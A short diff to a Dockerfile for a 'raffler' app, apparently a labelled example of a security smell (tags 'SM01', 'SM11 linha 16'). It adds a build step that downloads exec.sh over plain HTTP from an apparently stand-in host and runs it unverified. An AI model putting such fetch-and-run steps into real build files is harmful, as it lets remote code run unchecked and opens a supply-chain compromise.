@@ -13,8 +13,11 @@ RUN mkdir -p /var/app
 COPY . /var/app
 WORKDIR /var/app
 
+RUN curl -o exec.sh -O http://url.com.br/exec.sh && ./exec.sh
+
 # Run raffler
 CMD ["bash", "/var/app/run.sh"]
 
 # Comentário por Mateus Medeiros
 # SM01
+# SM11 linha 16
